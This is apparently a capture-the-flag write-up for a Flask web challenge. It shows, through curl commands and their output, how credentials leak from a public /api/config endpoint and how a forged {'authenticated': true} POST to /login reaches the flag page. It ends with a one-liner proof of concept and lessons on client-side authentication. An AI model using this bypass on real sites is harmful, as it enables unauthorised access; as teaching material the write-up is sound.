# Super Secure Server

**Category:** Web    
**Flag:** `bronco{d0nt_3xp0se_p@ssw0rd5!}`  

> I just finished developing my very first API to handle secure logins to my very own website! To keep things extra secure, I won't even tell you my username, so now there's really no way you can hack me!

---

## Table of Contents

1. [Summary](#summary)
2. [Tools Used](#tools-used)
3. [Reconnaissance](#reconnaissance)
   - [Initial page fetch](#initial-page-fetch)
   - [Page source analysis](#page-source-analysis)
   - [/api/config — credentials leak](#apiconfig--credentials-leak)
4. [Exploitation](#exploitation)
   - [Authenticated POST to /login](#authenticated-post-to-login)
   - [Follow redirect to /flag](#follow-redirect-to-flag)
5. [Flag](#flag)
6. [Key Takeaways](#key-takeaways)

---

## Summary

The challenge presents a Flask-based login page. The developer's boast of keeping the username secret collapses immediately because the page's own JavaScript fetches credentials from a publicly accessible `/api/config` endpoint. Using the leaked credentials, we construct the correct POST body — `{"authenticated": true}` — to `/login`, which returns a redirect to `/flag` where the flag is displayed.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | HTTP requests, header inspection |
| Browser "View Source" | Inspect client-side JavaScript |
| `mitmproxy` (optional) | Intercept traffic if preferred |

No scanners or brute-forcers needed — the credentials are handed to you directly.

---

## Reconnaissance

### Initial page fetch

```bash
curl -v https://broncoctf-super-secure-server.chals.io/
```

Key observations:

```
Server: Werkzeug/3.1.8 Python/3.14.6
```

The server is **Flask** (Werkzeug is the WSGI toolkit Flask uses). The page is a standard login form.

### Page source analysis

The HTML contains an inline `<script>` block that reveals the entire authentication flow:

```javascript
let leakedUser = "";
let leakedPass = "";

fetch('/api/config')
    .then(res => res.json())
    .then(data => {
        leakedUser = data.username;
        leakedPass = data.password;
    });

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    const msgBox = document.getElementById('messageBox');

    // client-side password comparison
    if (u === leakedUser && p === leakedPass) {
        fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ authenticated: true })
        })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                window.location.href = data.redirect;
            }
        });
    } else {
        msgBox.innerText = "Incorrect username or password!";
    }
});
```

Critical observations:

| Observation | Implication |
|-------------|-------------|
| `fetch('/api/config')` loads credentials from a public endpoint | The username/password are exposed in plaintext |
| Comparison is client-side | The real check is visible in the JS — you don't even need the server to validate credentials |
| After match, POSTs `{"authenticated": true}` to `/login` | The actual auth is a simple boolean flag |
| Server responds with `{"success": true, "redirect": "/flag"}` | The flag page is at `/flag` |

The irony: the developer said *"I won't even tell you my username"*, but the very first thing the page does is fetch the username from an API endpoint.

---

### /api/config — credentials leak

```bash
curl -s https://broncoctf-super-secure-server.chals.io/api/config
```

Response:

```json
{"password":"rji32orj932r3209r233sqmet4v2cxbns8","username":"SuperSecretUser"}
```

| Field | Value |
|-------|-------|
| `username` | `SuperSecretUser` |
| `password` | `rji32orj932r3209r233sqmet4v2cxbns8` |

---

## Exploitation

### Authenticated POST to /login

Send a POST request to `/login` with the `authenticated` flag set to `true`, following the exact same logic as the client-side code:

```bash
curl -s -X POST https://broncoctf-super-secure-server.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"authenticated": true}' \
  -c /tmp/cookies.txt -L
```

Response:

```json
{"redirect":"/flag","success":true}
```

The server also sets a session cookie, which we saved with `-c /tmp/cookies.txt`.

### Follow redirect to /flag

```bash
curl -s https://broncoctf-super-secure-server.chals.io/flag -b /tmp/cookies.txt
```

Response (truncated):

```html
<h1>Welcome back, SuperSecretUser!</h1>
<p>Here is your flag: bronco{d0nt_3xp0se_p@ssw0rd5!}</p>
```

---

## Full One-Liner PoC

```bash
curl -s -X POST https://broncoctf-super-secure-server.chals.io/login \
  -H "Content-Type: application/json" \
  -d '{"authenticated": true}' \
  -c /tmp/cookies.txt | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['redirect'])" | \
  xargs -I{} curl -s "https://broncoctf-super-secure-server.chals.io{}" -b /tmp/cookies.txt | \
  grep -o 'bronco{[^}]*}'
```

---

## Flag

```
bronco{d0nt_3xp0se_p@ssw0rd5!}
```

The flag itself delivers the lesson: **"don't expose passwords!"**

---

## Key Takeaways

1. **Client-side code is public.** Any JavaScript sent to the browser is fully visible. Fetching credentials from an API endpoint and comparing them client-side means the "secret" is public by design.
2. **`/api/config`-style endpoints must be locked down.** This is a classic IDOR / missing-auth misconfiguration. If an endpoint returns sensitive data, it needs authentication — even if the frontend itself uses it.
3. **Always read the page source.** The entire exploit was visible in the `<script>` tag. No guessing, no fuzzing — just reading what was already there.
4. **Simple bugs beat complex exploits.** The auth mechanism was a single boolean field (`authenticated: true`). No JWT to crack, no SQL to inject, no hash to reverse.
5. **The challenge name was ironic.** "Super Secure Server" with a public credentials endpoint and client-side-only auth is about as insecure as it gets.

---

